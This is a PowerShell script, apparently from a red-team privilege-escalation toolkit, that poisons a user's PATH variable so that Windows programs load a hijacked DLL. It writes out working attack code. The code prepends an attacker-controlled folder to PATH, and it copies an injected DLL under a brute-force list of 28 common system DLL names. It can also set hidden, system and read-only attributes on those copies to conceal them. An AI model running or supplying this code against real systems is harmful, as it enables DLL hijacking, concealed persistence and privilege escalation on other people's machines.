<#

PoisonPath.ps1 

A component of Windows 7.x, 8.x, and 10.x Local Elevation of Attacker's Privileges Toolkit (#LEAPKit) 
by Greg Linares (@Laughing_Mantis) of Cyberpoint SRT 

Poison Path is a simple script which will add a controlled folder to a user's 
PATH variable in order to hijack potential DLL Search Order vulnerabilities.  

This is a simple yet still a viable method to target applications who utilize insecure LoadLibraryEx calls 
and should be used prior to exploiting DLL path issues.

Current Version DLL Brute Force List:
VERSION.DLL,
imageres.dll,
msTracer.dll,
msfte.dll,
bcrypt.dll,
urlmon.dll,
SensApi.dll,
dbghelp.dll,
dbgcore.DLL,
USERENV.DLL,
MSIMG32.DLL,
RASAPI32.DLL,
dwrite.dll,
wow64log.dll,
tv_x64.dll,
OLEACC.dll,
OLEACCRC.dll,
DUI70.dll,
dwmapi.dll,
WINSTA.dll,
msvcp110.dll,
iertutil.dll,
PROPSYS.dll,
SspiCli.dll,
WINMM.dll,
WTSAPI32.dll,
Bcp47Langs.dll,
wincorlib.DLL


Usage:
Example 1: PoisonPath.ps1 -SHOW

This will display the current user's PATH variables and does not modify the variable.

Example 2: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin 

This will append the current user's PATH variable with the path "C:\Tools\LEAP\bin\"

Example 3: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -DLL C:\Tools\LEAP\bin\Inject.dll

This will attempt to brute force a DLL hijack by abusing commonly requested DLL names and 
creating a PATH variable folder containg these DLL files.  This is achieved by placing
a copy of Inject.dll for each DLL name listed in the DLL Brute Force List into 
the PATH variable.

Users can update this list with additional DLL files as they see fit in order to expand
capabilities of this tool kit.


Example 4: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -HIDDEN -DLL C:\Tools\LEAP\BIN\Inject.dll

As Above, however the brute forced DLL files will be assigned the HIDDEN, SYSTEM, & 
READONLY attributes.
#>

Param
(
    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [ValidateScript({
        if(!(Test-Path  $_ -PathType Container))
        {
            throw "Input folder doesn't exist: $_"
        }
        $true
    })]
    [ValidateNotNullOrEmpty()]
    [string]$Path = $((Get-Location -PSProvider FileSystem).Path + "\bin\"),

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$BRUTE,

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$HIDDEN,

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [string]$DLL = "",

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$Show
)



$DLLs = @("VERSION.DLL",
"imageres.dll",
"msTracer.dll",
"msfte.dll",
"bcrypt.dll",
"urlmon.dll",
"SensApi.dll",
"dbghelp.dll",
"dbgcore.DLL",
"USERENV.DLL",
"MSIMG32.DLL",
"RASAPI32.DLL",
"dwrite.dll",
"wow64log.dll",
"tv_x64.dll",
"OLEACC.dll",
"OLEACCRC.dll",
"DUI70.dll",
"dwmapi.dll",
"WINSTA.dll",
"msvcp110.dll",
"iertutil.dll",
"PROPSYS.dll",
"SspiCli.dll",
"WINMM.dll",
"WTSAPI32.dll",
"Bcp47Langs.dll",
"wincorlib.DLL")



$PathEnv = [Environment]::GetEnvironmentVariable("Path")

if ($Show)
{
    
    Write-Host "The current PATH Environment Variable is: $PathEnv" -ForegroundColor Green
    exit 
}

if (!(Test-Path  $Path -PathType Container))
{
    throw "Fatal Error: The specified folder: $Path does not exist"
}

if ($DLL.Length -eq 0)
{
    $DLL = $(Split-Path $MyInvocation.MyCommand.Path -Parent) + "\bin\LEAP.dll"
    
}

if (!(Test-Path $DLL))
{
    throw "Fatal Error: The specified file: $DLL does not exist."  
}


if ($BRUTE)
{
    Write-Host "Attempting Brute Force DLL Hijacking..."
    foreach ($dllfile in $DLLs)
    {
        Write-Host "Planting $dllfile in $Path"
        Copy-Item $DLL $($Path + "\" + $dllfile) -Force
        if ($HIDDEN)
        {
            $hidefile = Get-Item $($Path + "\" + $dllfile) -Force
            $hidefile.Attributes = "Hidden", "System", "ReadOnly"
        }

    }
}


Write-Host "Adding $Path to the PATH Environment variable" -ForegroundColor Red

[Environment]::SetEnvironmentVariable("PATH", $Path + ';' + $PathEnv, "User")

[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

$objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon 


$MyPath = Get-Process -id $pid | Select-Object -ExpandProperty Path
$objNotifyIcon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($MyPath)
$objNotifyIcon.BalloonTipIcon = "Info" 
$objNotifyIcon.BalloonTipText = "Hijacked the User's PATH variable.
Confirm with the Control Panel\User Accounts\User Accounts - Change My Env Variables Tab" 
$objNotifyIcon.BalloonTipTitle = "LEAP Toolkit"
 
$objNotifyIcon.Visible = $True 
$objNotifyIcon.ShowBalloonTip(8000)




